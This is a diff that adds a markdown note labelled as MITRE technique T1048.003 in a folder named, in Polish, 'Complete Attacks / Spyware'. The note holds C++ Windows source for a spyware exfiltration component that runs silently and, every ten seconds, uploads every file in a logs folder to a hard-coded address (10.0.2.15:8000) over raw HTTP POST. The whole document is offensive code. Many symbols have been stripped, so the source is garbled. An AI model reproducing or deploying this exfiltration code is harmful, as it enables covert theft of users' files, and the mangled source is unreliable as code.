@@ -1,0 +1,101 @@
+---
+title: "Exfiltration.T1048.003.Unencrypted Non-C2 Protocol"
+folder: "Całe Ataki/1. Spyware"
+---
+
+
+
+
+
+#include iostream
+#include fstream
+#include string
+#include winsock2.h
+#include ws2tcpip.h
+#include filesystem
+#include windows.h
+#include shellapi.h
+#pragma comment(lib, Ws2_32.lib)
+
+
+bool WyslijPlik(const stdstring& nazwaPliku, const stdstring& adresIP, int port) {
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        stdcerr  Błąd przy inicjalizacji Winsock.  stdendl;
+        return false;
+    }
+
+    SOCKET sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sockfd == INVALID_SOCKET) {
+        stdcerr  Błąd przy tworzeniu gniazda.  stdendl;
+        WSACleanup();
+        return false;
+    }
+
+    sockaddr_in serv_addr;
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(port);
+    inet_pton(AF_INET, adresIP.c_str(), &serv_addr.sin_addr);
+
+    if (connect(sockfd, reinterpret_castsockaddr(&serv_addr), sizeof(serv_addr)) == SOCKET_ERROR) {
+        stdcerr  Błąd przy łączeniu z serwerem.  stdendl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    stdifstream plik(nazwaPliku, stdiosbinary);
+    if (!plik.is_open()) {
+        stdcerr  Nie można otworzyć pliku   nazwaPliku  stdendl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    stdstring zawartosc((stdistreambuf_iteratorchar(plik)), stdistreambuf_iteratorchar());
+
+    stdstring header = POST  HTTP1.1rn;
+    header += Host  + adresIP +  + stdto_string(port) + rn;
+    header += Content-Type applicationoctet-streamrn;
+    header += Content-Length  + stdto_string(zawartosc.size()) + rnrn;
+    header += zawartosc;
+
+    int bytesSent = send(sockfd, header.c_str(), header.size(), 0);
+    if (bytesSent == SOCKET_ERROR) {
+        stdcerr  Błąd przy wysyłaniu danych.  stdendl;
+        closesocket(sockfd);
+        WSACleanup();
+        return false;
+    }
+
+    closesocket(sockfd);
+    plik.close();
+    WSACleanup();
+
+    stdcout  Plik   nazwaPliku   został wysłany na serwer.  stdendl;
+    return true;
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    while (true) {
+        stdstring folderPath = CUsersUserDownloadslogs;
+        stdstring adresIP = 10.0.2.15;
+        int port = 8000;
+
+        for (const auto& entry  stdfilesystemdirectory_iterator(folderPath)) {
+            if (entry.is_regular_file()) {
+                stdstring nazwaPliku = entry.path().string();
+                if (WyslijPlik(nazwaPliku, adresIP, port)) {
+                    stdcout  Wysyłanie pliku   nazwaPliku   powiodło się.  stdendl;
+                }
+                else {
+                    stdcerr  Wysyłanie pliku   nazwaPliku   nie powiodło się.  stdendl;
+                }
+            }
+        }
+        Sleep(10000);
+    }
+    return 0;
+}
